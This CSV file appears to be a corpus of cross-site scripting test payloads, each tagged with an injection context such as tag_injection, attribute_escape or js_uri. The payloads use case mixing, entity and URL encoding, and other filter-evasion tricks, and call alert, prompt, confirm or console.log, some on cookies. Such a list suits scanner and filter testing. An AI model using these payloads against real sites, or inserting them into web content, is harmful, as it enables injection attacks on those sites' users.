payload,context
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>"")",dom_sink
<svg onclick=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
""" onbegin=alert(String.fromCharCode(88,83,83)) """,attribute_escape
' onclick=confirm(1) ',attribute_escape
"""><svg onmous&#101;ov&#101;r=&#97;l&#101;rt(1)>",tag_injection
<scRipT>//coNsoLe.Log(doCumEnt.coOkiE)</scRipT>,script_injection
<svg onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onmouseover=prompt(document.cookie)/>,tag_injection
<svg onfocus=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
j&#97;v&#97;script:void(prompt('XSS')),js_uri
%3Csvg onbegin=prompt(location.hash)%3E,tag_injection
""" onbegin=alert(document.cookie) """,attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1)>",tag_injection
%27 onclick=console.log(document.cookie) %27,attribute_escape
%3Cscript%3E/x/confirm(document.cookie)%3C/script%3E,script_injection
""" oNfoCus=prOmpT(lOcaTioN.hAsh) """,attribute_escape
"""><svg onbegin=console.log('XSS')>",tag_injection
<svG oNbeGin=alErt(loCatIon.haSh)>,tag_injection
<script>\u0061lert(location.hash)</script>,script_injection
"""><svg ontoggle=confirm(document.domain)>",tag_injection
"<svg onfocus=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"<script>/x/confirm(String.fromCharCode(88,83,83))</script>",script_injection
' oNfoCus=alErt(doCumEnt.coOkiE) ',attribute_escape
<scRipT>/*/aLerT('XSS')</scRipT>,script_injection
"""><Svg onCliCk=ConFirM(lOcaTioN.hAsh)>",tag_injection
' oNclIck=prOmpT(1) ',attribute_escape
""" ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
' onerror=alert(1) ',attribute_escape
"%27 onbegin=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
%27 onmouseover=prompt(1) %27,attribute_escape
<script>confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
j&#97;vascript:\u0061lert(1),js_uri
<svg onerror=alert(location.hash)/>,tag_injection
"<svG oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
""" oNloAd=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape
""" oNclIck=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
%3Csvg onmouseover=alert(document.domain)/%3E,tag_injection
<svg onmouseover=console.log(document.domain)/>,tag_injection
"<svG oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<svG oNerRor=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
<scr	ipt>alert(1)</scr	ipt>,script_injection
%22><svg onmouseover=prompt(document.domain)>,tag_injection
<script>/*/confirm(location.hash)</script>,script_injection
"""><svg ontoggle=alert(document.domain)>",tag_injection
j&#97;vascript:alert(document.cookie),js_uri
<svg onerror=alert(location.hash)>,tag_injection
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
J&#97;VasCriPt:AleRt(1),js_uri
%3Cscript%3E//prompt(document.cookie)%3C/script%3E,script_injection
"<svG oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<script>/*/confirm(docum&#101;nt.cooki&#101;)</script>,script_injection
""" onclick=console.log('XSS') """,attribute_escape
<svg onmous&#101;ov&#101;r=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection
""" onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
"SetTimEouT(""ConFirM(dOcuMenT.dOmaIn)"",0)",dom_sink
%3Csvg ontoggle=confirm(1)%3E,tag_injection
<scr	ipt>confirm(document.domain)</scr	ipt>,script_injection
""" onbegin=console.log(1) """,attribute_escape
<scr	ipt>/*/console.log(location.hash)</scr	ipt>,script_injection
<img onload=\u0061lert(document.domain)>,tag_injection
""" onclick=consol&#101;.log('XSS') """,attribute_escape
%3Csvg onload=prompt(document.domain)%3E,tag_injection
"<svg onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onbegin=\u0061lert(document.cookie) ',attribute_escape
""" onfocus=\u0061lert('XSS') """,attribute_escape
%27 onfocus=alert(%27XSS%27) %27,attribute_escape
<svg onfocus=alert(document.domain)/>,tag_injection
"""><svg onmous&#101;&#101;nt&#101;r=confirm('XSS')>",tag_injection
"SetTimEouT(""ProMpt(1)"",0)",dom_sink
"<scr	ipt>//confirm(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
%22 onload=console.log(document.domain) %22,attribute_escape
<svg ontoggle=prompt(document.cookie)>,tag_injection
""" onload=\u0061lert(location.hash) """,attribute_escape
"<svG oNerRor=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"setTimeout(%22alert(1)%22,0)",dom_sink
<svG oNmoUseOveR=aLerT(dOcuMenT.cOokIe)/>,tag_injection
' onmous&#101;ov&#101;r=prompt('XSS') ',attribute_escape
<img onlo&#97;d=prompt(1)/>,tag_injection
<svG oNerRor=alErt(doCumEnt.coOkiE)>,tag_injection
%22 onfocus=confirm(location.hash) autofocus=%22,attribute_escape
<svG oNtoGglE=aLerT(dOcuMenT.cOokIe)>,tag_injection
""" onfocus=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
<svG oNmoUseEntEr=ConFirM(dOcuMenT.cOokIe)>,tag_injection
<svg on&#101;rror=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
<svg onfocus=prompt(%27XSS%27)>,tag_injection
<script>/*/\u0061lert('XSS')</script>,script_injection
""" ontoggle=confirm(document.domain) """,attribute_escape
"""><svg ontoggle=confirm('XSS')>",tag_injection
<script>//confirm(loc&#97;tion.h&#97;sh)</script>,script_injection
<svG oNfoCus=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
"""><svg onfocus=confirm(1)>",tag_injection
<scRipT>cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
""" oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
<script>prompt(loc&#97;tion.h&#97;sh)</script>,script_injection
<scr	ipt>/*/alert('XSS')</scr	ipt>,script_injection
<svG oNfoCus=coNfiRm(1)>,tag_injection
<script>/x/prompt(loc&#97;tion.h&#97;sh)</script>,script_injection
""" onerror=confirm(document.cookie) """,attribute_escape
"""%3E%3Cimg onload=prompt('XSS')%3E",tag_injection
"""><svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
""" oNbeGin=alErt(1) """,attribute_escape
<svG oNclIck=prOmpT(lOcaTioN.hAsh)>,tag_injection
"<scr	ipt>console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
""" onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
<svg onclick=alert(document.cookie)/>,tag_injection
<svg onload=confirm(1)>,tag_injection
<scr	ipt>/*/console.log(document.domain)</scr	ipt>,script_injection
"<svg onfocus=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"""%3E%3Csvg onload=prompt(document.domain)%3E",tag_injection
"""><Svg onLoaD=pRomPt(DocUmeNt.CooKie)>",tag_injection
%27 onerror=prompt(document.cookie) %27,attribute_escape
"%22><svg onclick=console.log(String.fromCharCode(88,83,83))>",tag_injection
""" onbegin=\u0061lert(document.domain) """,attribute_escape
"javascript:void(console.log(String.fromCharCode(88,83,83)))",js_uri
"""><svg onmouseover=console.log(String.fromCharCode(88,83,83))>",tag_injection
<svg onclick=prompt(document.cookie)/>,tag_injection
"""><Svg onMouSeoVer=prOmpT(dOcuMenT.dOmaIn)>",tag_injection
"<svg ontoggl&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" onmouseover=\u0061lert(1) """,attribute_escape
<script>//consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
""" oNtoGglE=pRomPt(DocUmeNt.DomAin) """,attribute_escape
"""%3E%3Csvg onload=alert(document.cookie)%3E",tag_injection
"""><Svg onMouSeeNteR=cOnsOle.loG(lOcaTioN.hAsh)>",tag_injection
<svg ontoggle=prompt(document.domain)>,tag_injection
%3Csvg onmouseover=alert(location.hash)/%3E,tag_injection
<script>&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
<script>//\u0061lert(1)</script>,script_injection
<svg on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
<svg onbegin=confirm(document.domain)>,tag_injection
%3Cscript%3E/*/confirm('XSS')%3C/script%3E,script_injection
""" onerror=alert('XSS') """,attribute_escape
"<svg onmous&#101;ov&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"' onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><svg onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
<svG oNfoCus=prOmpT(dOcuMenT.cOokIe)>,tag_injection
"""%3E%3Csvg onclick=confirm(document.cookie)%3E",tag_injection
document.write(%22<img src=x onerror=prompt(document.cookie)>%22),dom_sink
<svg onfocus=&#97;l&#101;rt('XSS')/>,tag_injection
"EvaL(""AleRt(DocUmeNt.DomAin)"")",dom_sink
"""><Svg onCliCk=AleRt('XSS')>",tag_injection
<svg on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cimg onload=alert(document.domain)/%3E,tag_injection
<svg onmouseover=\u0061lert(1)>,tag_injection
<svg onmouseover=alert(document.cookie)>,tag_injection
%3Cscript%3Econfirm`1`%3C/script%3E,script_injection
"""%3E%3Csvg onfocus=confirm(document.domain)%3E",tag_injection
<script>\u0061lert`'XSS'`</script>,script_injection
javascr	ipt:void(alert(location.hash)),js_uri
%3Cscript%3Eprompt(1)%3C/script%3E,script_injection
""" onfocus=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) &#97;utofocus=""",attribute_escape
""" on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
%22 onload=alert(document.domain) %22,attribute_escape
"%22 onerror=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
javascript:\u0061lert(1),js_uri
"""%3E%3Csvg onfocus=confirm('XSS')%3E",tag_injection
%3Csvg onload=console.log(1)/%3E,tag_injection
%22><svg onmouseenter=prompt(%27XSS%27)>,tag_injection
"%22 onload=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
""" onmous&#101;ov&#101;r=prompt('XSS') """,attribute_escape
<svg onb&#101;gin=consol&#101;.log('XSS')>,tag_injection
<scr	ipt>/*/prompt(location.hash)</scr	ipt>,script_injection
"""><svg onbegin=alert('XSS')>",tag_injection
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<svG oNtoGglE=aLerT(dOcuMenT.cOokIe)/>,tag_injection
"""><Svg onErrOr=AleRt(LocAtiOn.HasH)>",tag_injection
<script>/*/alert('XSS')</script>,script_injection
<svg onbegin=confirm('XSS')/>,tag_injection
javascript:void(prompt(document.domain)),js_uri
%3Csvg onfocus=console.log(1)%3E,tag_injection
""" onfocus=&#97;l&#101;rt('XSS') &#97;utofocus=""",attribute_escape
<svg ontoggl&#101;=confirm('XSS')>,tag_injection
<script>/x/confirm(1)</script>,script_injection
%3Csvg onmouseenter=confirm(1)%3E,tag_injection
%22><svg onclick=alert(document.domain)>,tag_injection
javascr	ipt:void(alert('XSS')),js_uri
"""%3E%3Csvg onclick=prompt(document.cookie)%3E",tag_injection
""" ontoggl&#101;=consol&#101;.log(1) """,attribute_escape
"""><svg onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection
%22 onload=alert(document.cookie) %22,attribute_escape
"""><svg onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onmouseover=confirm(document.cookie) ',attribute_escape
"<script>prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
<script>/x/confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
<svG oNfoCus=coNfiRm(LocAtiOn.HasH)>,tag_injection
<script>/x/consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
<scr	ipt>prompt`document.domain`</scr	ipt>,script_injection
%22><svg onbegin=console.log(location.hash)>,tag_injection
j&#97;vascript:console.log('XSS'),js_uri
<scr	ipt>//alert(document.domain)</scr	ipt>,script_injection
javascript:void(console.log(1)),js_uri
<svG oNbeGin=alErt(1)/>,tag_injection
"document.write(""<img src=x onerror=confirm(location.hash)>"")",dom_sink
<svg onbegin=confirm(location.hash)>,tag_injection
<svg onclick=prompt('XSS')>,tag_injection
""" onerror=confirm('XSS') """,attribute_escape
%27 onfocus=alert(location.hash) %27,attribute_escape
' onbegin=prompt(document.cookie) ',attribute_escape
' onb&#101;gin=prompt(docum&#101;nt.cooki&#101;) ',attribute_escape
<svg onbegin=prompt(%27XSS%27)>,tag_injection
"<script>//prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"setTimeout(""console.log(location.hash)"",0)",dom_sink
<svG oNmoUseEntEr=AleRt(DocUmeNt.CooKie)/>,tag_injection
<scRipT>cOnfIrm(doCumEnt.coOkiE)</scRipT>,script_injection
"' onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
j&#97;vascr	ipt:prompt(1),js_uri
""" onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
<svg on&#101;rror=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
' oNmoUseOveR=cOnsOle.loG('XSS') ',attribute_escape
<svg onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
%22><svg onload=prompt(1)>,tag_injection
<svg onmouseover=alert('XSS')/>,tag_injection
""" on&#101;rror=prompt('XSS') """,attribute_escape
"j&#97;vascript:prompt(String.fromCharCode(88,83,83))",js_uri
"<svg on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
j&#97;v&#97;script:void(&#97;l&#101;rt(loc&#97;tion.h&#97;sh)),js_uri
javascript:void(console.log(document.cookie)),js_uri
JavAscRipT:vOid(coNfiRm(DocUmeNt.DomAin)),js_uri
""" onfocus=\u0061lert(document.cookie) autofocus=""",attribute_escape
"""><Svg onBegIn=ProMpt(doCumEnt.doMaiN)>",tag_injection
%27 onerror=console.log(location.hash) %27,attribute_escape
' ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
j&#97;vascript:\u0061lert(document.domain),js_uri
<svg onclick=alert('XSS')>,tag_injection
<svg on&#101;rror=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
%3Csvg onclick=confirm(location.hash)%3E,tag_injection
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<svG oNmoUseOveR=aLerT(1)/>,tag_injection
""" oNmoUseEntEr=ConFirM(dOcuMenT.cOokIe) """,attribute_escape
"s&#101;tTim&#101;out(""consol&#101;.log(1)"",0)",dom_sink
' oNtoGglE=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape
%22><svg onmouseenter=prompt(document.cookie)>,tag_injection
<scRipT>//coNsoLe.Log(doCumEnt.doMaiN)</scRipT>,script_injection
<svg onfocus=\u0061lert(document.domain)>,tag_injection
"<img onload=alert(String.fromCharCode(88,83,83))>",tag_injection
%3Csvg onclick=prompt(location.hash)/%3E,tag_injection
%22 onmouseover=console.log(%27XSS%27) %22,attribute_escape
<script>prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
%3Csvg onerror=confirm(location.hash)%3E,tag_injection
"%27 ontoggle=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
%3Csvg ontoggle=console.log(1)/%3E,tag_injection
%3Csvg onerror=confirm(document.cookie)/%3E,tag_injection
' oNfoCus=coNsoLe.Log(loCatIon.haSh) ',attribute_escape
<svg onfocus=alert('XSS')>,tag_injection
"<script>&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
%27 onerror=alert(%27XSS%27) %27,attribute_escape
<svg onb&#101;gin=&#97;l&#101;rt(1)>,tag_injection
%3Csvg ontoggle=alert(location.hash)/%3E,tag_injection
"""><Svg onErrOr=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection
<scRipT>aLerT`dOcuMenT.dOmaIn`</sCriPt>,script_injection
<svg onmouseenter=alert(1)>,tag_injection
"<scRipT>pRomPt`StrIng.frOmCHarCodE(88,83,83)`</sCriPt>",script_injection
"' onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<svG oNbeGin=coNfiRm(1)>,tag_injection
"%3Cscript%3E/x/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"""%3E%3Csvg onfocus=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<svg onlo&#97;d=prompt(1)>,tag_injection
"<svg ontoggl&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
%22><svg onmouseenter=alert(document.domain)>,tag_injection
<scRipT>//coNfiRm('XSS')</sCriPt>,script_injection
%22><svg onload=confirm(%27XSS%27)>,tag_injection
<svg onb&#101;gin=confirm('XSS')/>,tag_injection
""" onclick=\u0061lert('XSS') """,attribute_escape
<svg onfocus=console.log(%27XSS%27)/>,tag_injection
%27 ontoggle=prompt(document.cookie) %27,attribute_escape
<script>/*/confirm('XSS')</script>,script_injection
""" onmouseover=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
<svg ontoggle=console.log(document.cookie)/>,tag_injection
"<svG oNtoGglE=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"&#101;v&#97;l(""confirm(docum&#101;nt.dom&#97;in)"")",dom_sink
' oNclIck=coNsoLe.Log(1) ',attribute_escape
%22 onfocus=prompt(document.domain) %22,attribute_escape
""" onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%22><svg onmouseover=alert(%27XSS%27)>,tag_injection
""" onfocus=prompt(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
""" onfocus=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"""><Svg onCliCk=AleRt(LocAtiOn.HasH)>",tag_injection
JavAscRipT:vOid(prOmpT(dOcuMenT.dOmaIn)),js_uri
%27 onclick=alert(document.cookie) %27,attribute_escape
""" onmouseover=\u0061lert(document.domain) """,attribute_escape
""" oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
"J&#97;VasCriPt:ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",js_uri
%3Cscript%3E/*/console.log(location.hash)%3C/script%3E,script_injection
' oNloAd=AleRt(DocUmeNt.CooKie) ',attribute_escape
' ontoggl&#101;=confirm(1) ',attribute_escape
"""><svg onerror=\u0061lert('XSS')>",tag_injection
"""><Svg onMouSeeNteR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
""" oNerRor=prOmpT(lOcaTioN.hAsh) """,attribute_escape
' onbegin=\u0061lert(location.hash) ',attribute_escape
%27 ontoggle=console.log(%27XSS%27) %27,attribute_escape
<svg onload=alert('XSS')>,tag_injection
"%3Csvg onmouseover=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"setTimeout(%22confirm(document.domain)%22,0)",dom_sink
%3Csvg onfocus=confirm(document.domain)/%3E,tag_injection
' oNclIck=coNfiRm(DocUmeNt.DomAin) ',attribute_escape
"""%3E%3Csvg onclick=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"""%3E%3Csvg onbegin=confirm(1)%3E",tag_injection
""" oNclIck=alErt(doCumEnt.doMaiN) """,attribute_escape
%27 ontoggle=console.log(document.cookie) %27,attribute_escape
"""><Svg onCliCk=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
%3Csvg onerror=confirm(document.domain)%3E,tag_injection
<scr	ipt>//console.log('XSS')</scr	ipt>,script_injection
<svG oNmoUseEntEr=ConFirM('XSS')/>,tag_injection
"""><Svg onErrOr=AleRt(DocUmeNt.CooKie)>",tag_injection
"' oNmoUseOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
%3Csvg ontoggle=alert(document.domain)/%3E,tag_injection
"""%3E%3Csvg onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection
%22 onload=confirm(document.domain) %22,attribute_escape
<svg onmouseover=confirm(location.hash)/>,tag_injection
"""><svg on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
"""><svg onclick=\u0061lert(document.domain)>",tag_injection
"%3Csvg onmouseenter=console.log(String.fromCharCode(88,83,83))/%3E",tag_injection
%3Csvg onerror=confirm('XSS')%3E,tag_injection
<svg on&#101;rror=consol&#101;.log(1)>,tag_injection
"""%3E%3Csvg onerror=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"%3Csvg onload=console.log(String.fromCharCode(88,83,83))/%3E",tag_injection
"%3Cscript%3E//confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%3Csvg onload=alert(1)%3E,tag_injection
' onfocus=console.log(document.cookie) ',attribute_escape
%22><svg onbegin=confirm(location.hash)>,tag_injection
' ontoggle=confirm(1) ',attribute_escape
""" onfocus=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"""><svg onfocus=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
"j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
